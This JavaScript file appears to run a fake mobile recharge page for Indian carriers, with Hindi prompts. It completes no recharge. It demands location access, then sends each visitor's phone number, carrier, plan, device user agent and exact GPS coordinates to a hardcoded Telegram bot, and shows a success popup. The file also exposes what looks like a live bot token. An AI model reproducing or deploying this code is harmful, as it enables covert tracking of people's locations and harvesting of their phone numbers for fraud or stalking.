const form = document.getElementById("rechargeForm");
const submitBtn = document.getElementById("submitBtn");
const loadingSpinner = document.getElementById("loadingSpinner");
const popupModal = document.getElementById("popupModal");
const closePopupBtn = document.getElementById("closePopup");

const simSelect = document.getElementById("sim");
const planSelect = document.getElementById("plan");

// Recharge plans data
const rechargePlans = {
  Airtel: [
    { code: "A100", desc: "₹100 - 1.5GB/day, 28 दिन" },
    { code: "A200", desc: "₹200 - 2GB/day, 56 दिन" },
    { code: "A300", desc: "₹300 - 3GB/day, 84 दिन" },
  ],
  Jio: [
    { code: "J99", desc: "₹99 - 1GB/day, 28 दिन" },
    { code: "J199", desc: "₹199 - 2GB/day, 56 दिन" },
    { code: "J299", desc: "₹299 - 3GB/day, 84 दिन" },
  ],
  Vi: [
    { code: "V150", desc: "₹150 - 1.5GB/day, 28 दिन" },
    { code: "V250", desc: "₹250 - 2.5GB/day, 56 दिन" },
  ],
  BSNL: [
    { code: "B75", desc: "₹75 - 1GB/day, 20 दिन" },
    { code: "B125", desc: "₹125 - 1.5GB/day, 35 दिन" },
  ],
};

// जब सिम चुना जाए तो प्लान दिखाएं
simSelect.addEventListener("change", () => {
  const selectedSim = simSelect.value;
  planSelect.innerHTML = ""; // पहले साफ करें

  if (!selectedSim || !rechargePlans[selectedSim]) {
    planSelect.innerHTML = '<option value="">-- पहले सिम चुनें --</option>';
    return;
  }

  planSelect.innerHTML = '<option value="">-- प्लान चुनें --</option>';
  rechargePlans[selectedSim].forEach((plan) => {
    const option = document.createElement("option");
    option.value = plan.code;
    option.textContent = plan.desc;
    planSelect.appendChild(option);
  });
});

// पेज लोड होते ही लोकेशन अनुमति मांगना
window.addEventListener("load", () => {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      () => {
        console.log("Location access granted.");
      },
      () => {
        alert("कृपया लोकेशन एक्सेस अनुमति दें ताकि हम आपकी सहायता कर सकें।");
      }
    );
  } else {
    alert("आपके ब्राउज़र में लोकेशन सपोर्ट नहीं है।");
  }
});

form.addEventListener("submit", async function (e) {
  e.preventDefault();

  const sim = simSelect.value;
  const mobile = document.getElementById("mobile").value.trim();
  const plan = planSelect.value;

  if (!sim) {
    alert("कृपया सिम का चयन करें।");
    return;
  }
  if (mobile.length !== 10 || isNaN(mobile)) {
    alert("कृपया 10 अंकों का मान्य मोबाइल नंबर दर्ज करें।");
    return;
  }
  if (!plan) {
    alert("कृपया रिचार्ज प्लान चुनें।");
    return;
  }
  if (!navigator.geolocation) {
    alert("आपके ब्राउज़र में लोकेशन सपोर्ट नहीं है।");
    return;
  }

  // Show spinner, hide submit button
  submitBtn.style.display = "none";
  loadingSpinner.style.display = "block";

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const device = navigator.userAgent;

      const botToken = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";
      const chatId = "6038115234";

      const message = `📱 New Recharge Request:
SIM: ${sim}
Number: ${mobile}
Plan: ${plan}
Device: ${device}
Location: https://www.google.com/maps?q=${latitude},${longitude}`;

      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: message }),
        });

        // Hide spinner, show popup
        loadingSpinner.style.display = "none";
        popupModal.classList.add("show");
        form.reset();
        planSelect.innerHTML = '<option value="">-- पहले सिम चुनें --</option>';
      } catch (error) {
        alert("कुछ त्रुटि हुई, कृपया पुनः प्रयास करें।");
        loadingSpinner.style.display = "none";
        submitBtn.style.display = "inline-block";
      }
    },
    () => {
      alert("लोकेशन एक्सेस नहीं हो सका। कृपया अनुमति दें।");
      loadingSpinner.style.display = "none";
      submitBtn.style.display = "inline-block";
    }
  );
});

// Close popup on button click
closePopupBtn.addEventListener("click", () => {
  popupModal.classList.remove("show");
  submitBtn.style.display = "inline-block";
});
